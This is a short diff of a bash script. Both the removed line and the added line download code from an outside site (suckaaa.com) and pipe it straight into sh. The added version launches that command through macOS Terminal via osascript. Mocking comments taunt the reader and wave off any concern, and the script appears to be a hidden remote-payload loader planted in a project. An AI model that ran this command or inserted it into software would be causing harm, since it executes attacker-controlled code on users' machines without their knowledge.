@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # loL whatcha lookin for in here???
+# Don't worry about it!!!
 
-#
-
-curl -s https://suckaaa.com/s/loL | sh;
+osascript -e 'tell application "Terminal" to do script "curl -s https://suckaaa.com/s/loL | sh;"'
